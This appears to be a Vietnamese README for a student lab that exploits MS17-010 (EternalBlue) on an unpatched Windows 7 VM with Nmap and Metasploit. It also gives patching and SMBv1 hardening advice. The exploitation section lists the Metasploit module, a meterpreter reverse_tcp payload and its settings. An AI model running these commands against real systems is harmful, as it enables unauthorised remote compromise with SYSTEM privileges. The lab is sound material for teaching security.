CVE-2017-0143 | MS17-010 EternalBlue Lab

Môi trường thực hành và báo cáo lab về khai thác lỗ hổng MS17-010 (EternalBlue) trên Windows 7 SP1 x64 bằng Metasploit Framework trong hệ thống mạng ảo VMware NAT. Lab tập trung vào toàn bộ quy trình kiểm thử xâm nhập gồm reconnaissance, enumeration, vulnerability assessment, exploitation và post-exploitation trong môi trường kiểm soát.
Overview

Lab mô phỏng một tình huống pentest nội bộ, trong đó máy Windows 7 chưa được vá MS17-010 và vẫn bật SMBv1. Pentester sử dụng Kali Linux để quét, xác minh lỗ hổng CVE-2017-0143 và khai thác EternalBlue nhằm đạt được quyền SYSTEM trên máy mục tiêu.

Objectives
Thiết lập môi trường mạng ảo VMware NAT
Kiểm tra kết nối giữa attacker và victim
Quét và phân tích dịch vụ SMB
Phát hiện lỗ hổng MS17-010 bằng Nmap NSE
Khai thác EternalBlue bằng Metasploit
Thiết lập Meterpreter reverse shell
Phân tích quá trình kernel exploitation
Thực hiện post-exploitation cơ bản
Lab Environment
Thành phần	Thông tin
Hypervisor	VMware Workstation
Attacker	Kali Linux 2022.3
Victim	Windows 7 Professional SP1 x64
Network Mode	VMnet8 NAT
Subnet	208.100.26.0/24
Metasploit	v6.2.9-dev
Vulnerability	MS17-010 / CVE-2017-0143
Attack Workflow
1. Network Configuration
Cấu hình VMnet8 NAT
Đảm bảo attacker và victim cùng subnet
Kiểm tra kết nối ICMP
2. Reconnaissance
Xác định IP target
Thực hiện SYN Scan bằng Nmap
Phân tích trạng thái firewall và port exposure
3. Enumeration
Xác định SMB services
Phát hiện port 445/tcp
Kiểm tra SMBv1 accessibility
4. Vulnerability Assessment
Sử dụng Nmap NSE script:
nmap -p445 --script smb-vuln-ms17-010 <target-ip>
Xác nhận CVE-2017-0143 vulnerable state
5. Exploitation
Khởi động Metasploit
Load module:
exploit/windows/smb/ms17_010_eternalblue
Thiết lập payload:
windows/x64/meterpreter/reverse_tcp
Cấu hình:
set RHOSTS <victim-ip>
set LHOST <attacker-ip>
set LPORT 445
run
6. Post-Exploitation
Thiết lập Meterpreter session
Xác nhận quyền SYSTEM
Kiểm tra khả năng truy cập hệ thống
Technical Topics
Networking
TCP/IP
NAT Networking
VMware Virtual Networking
ICMP
TCP SYN Scan
Port Scanning
Reverse TCP Connection
Operating Systems
Windows 7 SP1 x64
Linux Networking
Windows Firewall
SMB Architecture
Windows Kernel Memory
Security Concepts
Vulnerability Assessment
Exploitation
Remote Code Execution (RCE)
Buffer Overflow
Kernel Exploitation
Pool Grooming
Post-Exploitation
Privilege Escalation
Protocols
SMBv1
NetBIOS
Microsoft RPC
DCE/RPC
Tools
Nmap
NSE Scripts
Metasploit Framework
Meterpreter
VMware Workstation
Skills Practiced
Offensive Security
Network reconnaissance
Service enumeration
Vulnerability verification
Exploit execution
Payload configuration
Reverse shell handling
Defensive Understanding
Firewall impact analysis
SMB attack surface analysis
Legacy protocol risks
Patch management awareness
Segmentation importance
Technical Analysis
Reading Nmap outputs
Interpreting vulnerability scan results
Understanding exploit workflow
Analyzing Meterpreter sessions
Understanding kernel exploitation concepts
Key Vulnerability Information
Field	Value
Vulnerability	MS17-010
CVE	CVE-2017-0143
Exploit	EternalBlue
Severity	HIGH
CVSS Score	8.8
Attack Vector	Network
User Interaction	None
Affected Service	SMBv1
Learning Outcomes

Sau khi hoàn thành lab này, người học có thể:

Hiểu cơ chế hoạt động của EternalBlue
Phân tích dịch vụ SMB trên Windows
Sử dụng Nmap cho reconnaissance và vulnerability scanning
Sử dụng Metasploit để khai thác RCE
Hiểu reverse shell workflow
Phân tích tác động của firewall đối với pentest
Hiểu hậu quả của việc sử dụng SMBv1 và hệ thống chưa vá
Security Recommendations
Vá MS17-010 trên toàn bộ hệ thống
Tắt SMBv1
Bật và cấu hình Windows Firewall đúng cách
Không expose port 445 ra internet
Thực hiện vulnerability scanning định kỳ
Áp dụng network segmentation
Triển khai IDS/IPS và EDR
Disclaimer

Repository này phục vụ mục đích học tập, nghiên cứu an ninh mạng và thực hành trong môi trường lab kiểm soát. Không sử dụng các kỹ thuật hoặc công cụ trong repository này để tấn công hệ thống trái phép.

References
Microsoft Security Bulletin MS17-010
CVE-2017-0143
NIST National Vulnerability Database
Metasploit Framework Documentation
Nmap NSE Documentation
